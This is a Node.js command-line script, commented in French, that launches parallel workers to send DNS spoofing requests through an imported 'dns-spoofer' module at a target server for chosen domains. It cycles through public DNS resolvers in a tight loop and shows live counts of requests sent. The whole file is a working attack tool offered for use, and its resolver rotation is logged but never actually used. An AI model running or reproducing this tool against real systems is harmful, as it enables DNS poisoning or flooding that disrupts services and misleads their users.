#!/usr/bin/env node
const os = require("os");
const { sendDnsSpoof, freeDNS } = require("./dns-spoofer.js");
const fs = require("fs");

// ------------------
// CLI arguments
// ------------------
const args = process.argv.slice(2);
const customFileArg = args.find(a => a.startsWith("-dns="));
const domainArg = args.find(a => a.startsWith("-domain="));
const serverArg = args.find(a => a.startsWith("-server="));
const testMode = args.includes("--test");
const workersArg = args.find(a => a.startsWith("--workers="));
const intervalArg = args.find(a => a.startsWith("--interval="));

const server = serverArg ? serverArg.split("=")[1] : null;
if (!server) {
  console.error("[-] Veuillez fournir le serveur cible via -server=IP");
  process.exit(1);
}

const domains = domainArg ? domainArg.split("=")[1].split(",") : ["example.com"];
let userList = [];

// Charger liste custom si fournie
if (customFileArg) {
  const file = customFileArg.split("=")[1];
  if (fs.existsSync(file)) {
    try {
      const data = JSON.parse(fs.readFileSync(file, "utf8"));
      if (Array.isArray(data)) userList = data;
      else console.warn("[-] Le JSON custom doit être un array d'IP");
    } catch (e) {
      console.error("[-] Impossible de lire le JSON custom :", e.message);
    }
  } else console.error("[-] Fichier JSON custom non trouvé :", file);
}

// Fusion avec freeDNS et suppression doublons
if (userList.length < 100) userList = [...new Set([...userList, ...freeDNS])];
console.log(`[i] ${userList.length} serveurs DNS prêts à l'emploi`);

// ------------------
// Multicores et queue circulaire
// ------------------
const numCores = workersArg ? parseInt(workersArg.split("=")[1], 10) : os.cpus().length || 4;
console.log(`🚀 Lancement de ${numCores} workers en parallèle...\n`);

const interval = intervalArg ? parseInt(intervalArg.split("=")[1], 10) : 0;

// Queue circulaire
let ipQueue = [...userList];
function getNextDNS() {
  if (ipQueue.length === 0) ipQueue = [...userList]; // reset queue
  return ipQueue.shift(); // pas de shuffle
}

// Stats
const stats = Array(numCores).fill(0);
let totalRequests = 0;

// Fonction worker
function startWorker(id) {
  (function loop() {
    for (const domain of domains) {
      const dnsIP = getNextDNS();
      if (testMode) {
        console.log(`[Worker ${id}] [TEST] spoof vers ${dnsIP} pour ${domain}`);
      } else {
        sendDnsSpoof(server, domain);
        stats[id]++;
        totalRequests++;
        console.log(`[Worker ${id}] spoof vers ${dnsIP} pour ${domain}`);
      }
    }
    if (interval > 0) {
      setTimeout(loop, interval);
    } else {
      setImmediate(loop);
    }
  })();
}

// Démarrage des workers
for (let i = 0; i < numCores; i++) startWorker(i);

// Affichage des stats live toutes les 5 secondes
if (!testMode) {
  setInterval(() => {
    console.clear();
    console.log("=== STATISTIQUES LIVE ===");
    stats.forEach((count, idx) => console.log(`Worker ${idx}: ${count} requêtes`));
    console.log(`Total requêtes envoyées: ${totalRequests}`);
    console.log(`DNS restants dans la queue: ${ipQueue.length}`);
    console.log("==========================");
  }, 5000);
} else {
  console.log("[i] Mode TEST activé : aucune requête réelle envoyée");
}
